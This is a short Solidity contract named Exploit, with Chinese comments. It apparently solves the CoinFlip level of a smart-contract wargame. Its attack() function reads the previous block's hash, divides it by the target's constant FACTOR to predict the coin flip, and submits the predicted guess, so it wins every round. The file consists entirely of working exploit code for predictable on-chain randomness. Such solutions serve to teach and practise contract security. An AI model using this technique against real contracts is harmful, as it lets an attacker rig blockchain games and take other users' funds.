// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

//import './SafeMath.sol';

// 定义与目标合约相匹配的接口
interface CoinFlip {
    function flip(bool _guess) external returns (bool) ;
}

contract Exploit {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address public target;
    
    // 设置目标合约的地址
    function setTarget(address _target) public {
        target = _target;
    }

    event Log(uint256);

    function attack() public{
        CoinFlip coinflip = CoinFlip(target);
        uint256 blockValue = uint256(blockhash(block.number - 1));
        emit Log(blockValue);
        uint256 coinFlip =  blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        coinflip.flip(side);
    }

    function check() public view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip =  blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;
        }
}
